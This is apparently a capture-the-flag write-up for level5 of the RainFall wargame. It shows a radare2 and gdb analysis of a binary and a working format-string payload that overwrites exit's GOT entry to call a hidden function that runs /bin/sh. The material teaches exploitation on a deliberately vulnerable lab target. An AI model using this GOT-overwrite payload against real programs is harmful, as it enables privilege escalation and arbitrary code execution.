As always we start this level with `radare2` and `gdb` to gather informations:
```bash
[0x080483f0]> afl
0x08048380    1      6 sym.imp.printf
0x08048390    1      6 sym.imp._exit
0x080483a0    1      6 sym.imp.fgets
0x080483b0    1      6 sym.imp.system
0x080483d0    1      6 sym.imp.exit
0x080483e0    1      6 sym.imp.__libc_start_main
0x080483f0    1     33 sub.entry0_80483f0
0x08048420    6     85 sym.__do_global_dtors_aux
0x08048480    4     35 sym.frame_dummy
0x080485a0    4     42 sym.__do_global_ctors_aux
0x08048590    1      2 sym.__libc_csu_fini
0x08048592    1      4 sym.__i686.get_pc_thunk.bx
0x080484c2    1     66 sym.n
0x080485cc    1     26 sub._fini_80485cc
0x08048520    4     97 sym.__libc_csu_init
0x080484a4    1     30 sym.o
0x08048504    1     11 sub.main_8048504
0x08048334    3     46 sub._init_8048334
0x080483c0    1      6 sub.loc.imp.__gmon_start___80483c0
[0x080483f0]> pdf @ sym.o
┌ 30: sym.o (); // noreturn
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      83ec18         sub esp, 0x18
│           0x080484aa      c70424f085..   mov dword [esp], str._bin_sh ; [0x80485f0:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x080484b1      e8fafeffff     call sym.imp.system         ; int system(const char *string)
│           0x080484b6      c704240100..   mov dword [esp], 1          ; int status
└           0x080484bd      e8cefeffff     call sym.imp._exit          ; void _exit(int status)
[0x080483f0]>
[0x080483f0]> pdf @ sym.n
            ; CALL XREF from sub.main_8048504 @ 0x804850a(x)
┌ 66: sym.n (); // noreturn
│ afv: vars(3:sp[0x20c..0x218])
│           0x080484c2      55             push ebp
│           0x080484c3      89e5           mov ebp, esp
│           0x080484c5      81ec18020000   sub esp, 0x218
│           0x080484cb      a148980408     mov eax, dword [obj.stdin]  ; loc.__bss_start
│                                                                      ; [0x8049848:4]=0
│           0x080484d0      89442408       mov dword [stream], eax     ; FILE *stream
│           0x080484d4      c744240400..   mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
│           0x080484dc      8d85f8fdffff   lea eax, [format]
│           0x080484e2      890424         mov dword [esp], eax        ; char *s
│           0x080484e5      e8b6feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484ea      8d85f8fdffff   lea eax, [format]
│           0x080484f0      890424         mov dword [esp], eax        ; const char *format
│           0x080484f3      e888feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080484f8      c704240100..   mov dword [esp], 1          ; int status
└           0x080484ff      e8ccfeffff     call sym.imp.exit           ; void exit(int status)
[0x080483f0]>
```

The function `o` has a call to `/bin/sh` but isn't called by the program, so we're going to try and call it ourselves !
Since we want to execute a function, we are going to try and **replace `exit`'s call with a call to `o`**.
Using `gdb` we find `exit`'s GOT address:
```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

Let's see where our printf writes:
```bash
level5@RainFall:~$ ./level5
AAAA %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
```

Now that we know this, we're going to convert `o`'s address in dec, `0x080484a4 = 134513828 - 4 = 134513824` (4 chars removed for the address).
And we craft a script to finally exploit it:
```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"' && cat) | ./level5
```
And we get the flag.



